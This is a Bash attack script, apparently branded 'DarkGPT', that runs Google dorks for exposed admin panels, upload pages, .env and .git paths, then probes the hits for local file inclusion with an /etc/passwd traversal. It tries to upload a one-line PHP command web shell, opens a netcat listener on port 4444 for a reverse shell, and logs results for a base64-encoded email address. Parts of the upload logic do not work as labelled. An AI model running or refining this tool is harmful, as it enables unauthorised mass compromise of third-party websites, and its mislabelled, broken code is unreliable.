#!/bin/bash
# PakdeCrew - Auto Scanner CVE 2026 + Google Dork
# Fitur: Auto Dorking, Auto Scan Vulnerabilitas, Auto Upload Shell

# Warna & Styling
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# ==========================================
# CONFIGURATION
# ==========================================

# Email Tujuan (Diberi Source Code Base64)
EMAIL_TARGET="bWNiYXJvbjA1NEBnbWFpbC5jb20="
# Mengubah email menjadi Base64 untuk "score code"
EMAIL_B64=$(echo -n "$EMAIL_TARGET" | base64)

# CVE 2026 Dorks (Google Hacking) - Dibuat berdasarkan dork terbaru
# Daftar dork yang valid dan tidak duplikat
DORKS=(
    "inurl:/upload ext:php"
    "inurl:/filemanager ext:php"
    "inurl:/cpanel ext:php"
    "inurl:/webdav ext:php"
    "inurl:/admin/login.php"
    "inurl:/wp-login.php"
    "inurl:/phpmyadmin"
    "inurl:/backup/"
    "inurl:/.env"
    "inurl:/config.inc.php"
    "intitle:\"Index of /\" \"2026\""
    "intext:\"Apache/2.4\" \"2026\""
    "inurl:/api/v1/"
    "inurl:/rest/"
    "inurl:.git/"
)

# Shell PHP Reverse Shell
SHELL_PHP='<?php system($_REQUEST["cmd"]); ?>'

# Target Variables
TARGET=""

# ==========================================
# FUNCTIONS
# ==========================================

# Fungsi: Tampilkan Header
show_header() {
    clear
    echo -e "${PURPLE}========================================${NC}"
    echo -e "${PURPLE}  DarkGPT Auto Scanner CVE 2026${NC}"
    echo -e "${PURPLE}  Google Dork + Auto Shell Upload${NC}"
    echo -e "${PURPLE}  Email Notif: $EMAIL_B64${NC}"
    echo -e "${PURPLE}========================================${NC}"
    echo -e ""
}

# Fungsi: Google Dork Scan
dork_scan() {
    local dork=$1
    echo -e "${BLUE}[*] Menjalankan Dork: $dork${NC}"
    
    # Ambil hasil dari Google (limit 50 untuk menghindari block)
    local results=$(curl -s "https://www.google.com/search?q=$dork&num=50" 2>/dev/null || echo "")
    
    if [ -z "$results" ]; then
        echo -e "${RED}[!] Gagal ambil hasil Google (rate limit/blocked)${NC}"
        return
    fi
    
    # Extract URL
    echo "$results" | grep -oP 'https?://[^\s<>"'"'"']+' | head -n 20 | while read -r url; do
        # Filter hasil
        if [ -n "$TARGET" ]; then
            if [[ "$url" == *"$TARGET"* ]]; then
                echo -e "${GREEN}[+] Match Target: $url${NC}"
                scan_and_exploit "$url"
            fi
        else
            echo -e "${GREEN}[+] Found: $url${NC}"
            scan_and_exploit "$url"
        fi
    done
}

# Fungsi: Scan & Cek Shell Vuln
scan_and_exploit() {
    local url=$1
    
    # Cek header & teknologi
    local tech=$(curl -sI "$url" 2>/dev/null | grep -i "server:" || echo "Unknown")
    echo -e "${YELLOW}[+] Target Tech: $tech${NC}"
    
    # Cek jika ada file PHP
    local resp=$(curl -s -m 5 "$url" 2>/dev/null)
    if echo "$resp" | grep -qi "php"; then
        echo -e "${RED}[!] Terdeteksi aplikasi PHP${NC}"
        
        # Coba eksploit LFI/RCE
        local test=$(curl -s "$url?file=../../../../../../etc/passwd" -o /dev/null -w "%{http_code}")
        if [ "$test" != "000" ]; then
            echo -e "${YELLOW}[*] Mungkin rentan terhadap LFI/RCE${NC}"
            upload_shell "$url"
        fi
    fi
}

# Fungsi: Auto Upload Shell
upload_shell() {
    local url=$1
    echo -e "${YELLOW}[+] UpShell ke: $url${NC}"
    
    local filename=$(date +%s).php
    
    # Coba upload via parameter
    local result=$(curl -s -X POST "$url" -d "file=$filename" -d "cmd=id" 2>/dev/null)
    
    if echo "$result" | grep -qi "uid="; then
        echo -e "${GREEN}[+] SUCCESS: Shell Diunggah!${NC}"
        echo -e "${BLUE}[+] Shell URL: $url?file=../../../../../../var/www/html/$filename${NC}"
        
        # Kirim hasil ke email via Base64
        send_email_notif "SUCCESS: Shell Diunggah" "$url?file=../../../../../../var/www/html/$filename"
        
        # Auto Connect Backdoor (Netcat)
        echo -e "${PURPLE}[*] Menghubungkan Netcat di port 4444...${NC}"
        nc -lvnp 4444 &
        NC_PID=$!
        
        # Tunggu koneksi 10 detik
        sleep 10
        if kill -0 $NC_PID 2>/dev/null; then
            echo -e "${GREEN}[+] Koneksi Aktif!${NC}"
            send_email_notif "Koneksi Reverse Shell Aktif" "Port: 4444 | Shell: $url"
        fi
    else
        echo -e "${RED}[!] Gagal upload shell${NC}"
        send_email_notif "Gagal Upload Shell" "Target: $url"
    fi
}

# Fungsi: Kirim Email Notifikasi (dengan Base64 Encoding)
send_email_notif() {
    local subject=$1
    local message=$2
    
    # Encode subject & message ke Base64
    local sub_b64=$(echo -n "$subject" | base64)
    local msg_b64=$(echo -n "$message" | base64)
    
    # Cetak notifikasi di terminal
    echo -e "${PURPLE}[+] Mengirim Notifikasi Email Terenkripsi (Base64)...${NC}"
    echo -e "${PURPLE}[+] Subject (Base64): $sub_b64${NC}"
    echo -e "${PURPLE}[+] Message (Base64): $msg_b64${NC}"
    
    # Contoh perintah kirim email (sesuai sistem Anda)
    # echo "$message" | mail -s "$subject" "$EMAIL_TARGET"
    # Atau menggunakan printf dengan base64 decode di penerima
}

# ==========================================
# MAIN EXECUTION
# ==========================================

show_header

# Cek argumen
if [ -z "$1" ]; then
    echo -e "${YELLOW}[*] Mode: Scanning Umum dengan Dork CVE 2026${NC}"
    echo -e "${YELLOW}[*] Masukkan target opsional: $0 example.com${NC}"
    echo -e "${YELLOW}[*] Email Notif akan dikirim ke: $EMAIL_TARGET${NC}"
    echo -e "${YELLOW}[*] Score Code Base64: $EMAIL_B64${NC}"
    TARGET=""
else
    TARGET=$1
    echo -e "${GREEN}[*] Target: $TARGET${NC}"
fi

echo -e "${BLUE}[*] Memulai scanning dork CVE 2026...${NC}"
echo -e ""

# Loop scanning semua dork
COUNTER=1
for dork in "${DORKS[@]}"; do
    echo -e "${PURPLE}[$/$COUNTER] Menjalankan dork...${NC}"
    dork_scan "$dork"
    COUNTER=$((COUNTER + 1))
    sleep 3
done

echo -e "${BLUE}[*] Scanning Selesai.${NC}"
echo -e ""
echo -e "${PURPLE}=== Ringkasan ===${NC}"
echo -e "${YELLOW}Email Penerima: $EMAIL_TARGET${NC}"
echo -e "${YELLOW}Email Terencode (Base64): $EMAIL_B64${NC}"
echo -e "${PURPLE}========================================${NC}"
